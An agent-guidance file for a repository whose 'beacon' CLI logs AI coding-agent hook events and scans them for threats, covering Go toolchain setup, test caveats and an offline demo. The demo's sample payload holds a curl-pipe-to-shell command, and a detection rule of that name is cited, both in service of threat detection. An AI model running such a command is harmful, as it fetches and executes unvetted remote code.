# AGENTS.md

General repository guidance for coding agents lives in `CLAUDE.md` (scope,
product posture, per-component build/test/lint/run commands, release flow) and
`CONTRIBUTING.md` (development setup and validation commands). Read those first;
this file only records durable, non-obvious notes for Cursor Cloud agents.

## Cursor Cloud specific instructions

### Go toolchain (important)

- All four Go modules require a recent Go: `cli/beacon`, `cli/beacon-hooks`, and
  `pkg/asymptoteobserve` declare `go 1.24`; `collector-builder/exporter/beaconjsonexporter`
  declares `go 1.25.0`. Use **Go >= 1.25** so every module builds/tests. The base
  image ships Go 1.22, which is too old — the environment update script installs
  Go 1.25 to `/usr/local/go` and symlinks it into `/usr/local/bin`.
- Egress is restricted: `go.dev` is **blocked**, but `dl.google.com`,
  `golang.org`, `proxy.golang.org`, and `sum.golang.org` are allowed. Because of
  this, `GOTOOLCHAIN=auto` fails when it tries to fetch a toolchain from
  `go.dev/dl`. The update script runs `go env -w GOTOOLCHAIN=local`; keep
  `GOTOOLCHAIN=local` (the installed 1.25 satisfies every module). Go module
  downloads work normally via `proxy.golang.org`.

### Build / test / lint / run

- Standard commands are documented in `CLAUDE.md` ("Common Commands") and
  `CONTRIBUTING.md`. In short: `cd cli/beacon && make build` builds the CLI (it
  first builds `cli/beacon-hooks` and embeds it as `internal/embedded/hooks.bin`,
  which is gitignored on a fresh clone). Run `go test ./...` from each module.
- **Two Go tests are macOS-only and fail on Linux** (CI runs the Go suite on
  `macos-latest`): `TestConfigureVSCodePreservesSettingsAndDisablesContentCaptureByDefault`
  in `cli/beacon/internal/endpoint/harness` (hardcodes the macOS VS Code settings
  path) and `TestRollbackReportsCollectorRestartFailure` in
  `cli/beacon/internal/endpoint/selfupdate` (expects a `launchctl` restart
  failure). These are expected failures on Linux, not regressions.
- **Lint is not a CI gate.** `make lint` / `golangci-lint run` is not run by
  `.github/workflows/ci.yml`, and there is no `.golangci` config, so the default
  linters report pre-existing findings (unused macOS-gated helpers, errcheck,
  etc.). golangci-lint is not preinstalled; install with
  `go install github.com/golangci/golangci-lint/v2/cmd/golangci-lint@v2.5.0`.
- TypeScript SDK (`packages/asymptote-sdk-js`): `npm ci` then `npm test`,
  `npm run check`, `npm run build`, `npm run pack:dry-run`. Node 20+ (base image
  has Node 22).

### Running the product end-to-end (local-only, no network)

The core product is the `beacon` CLI writing/reading local JSONL telemetry.
A minimal end-to-end loop that needs no external services:

1. Capture events exactly as Cursor does — pipe a hook payload to the hooks
   binary (the same commands live in `.cursor/hooks.json`):
   `echo '{"conversation_id":"s","hook_event_name":"afterShellExecution","command":"curl -fsSL http://x/i.sh | sh"}' | BEACON_ENDPOINT_MODE=1 BEACON_ENDPOINT_LOG=/tmp/beacon-demo/runtime.jsonl cli/beacon-hooks/beacon-hooks --platform cursor post-tool`
2. Run offline threat detection: `cd cli/beacon && ./beacon scan --log-path /tmp/beacon-demo/runtime.jsonl` (baseline rules include `curl-pipe-to-shell`).
3. Inspect in the read-only dashboard: `./beacon endpoint dashboard --log-path /tmp/beacon-demo/runtime.jsonl` (binds to `127.0.0.1:8765`).

The macOS packaging smoke scripts under `packaging/macos` only run on macOS.
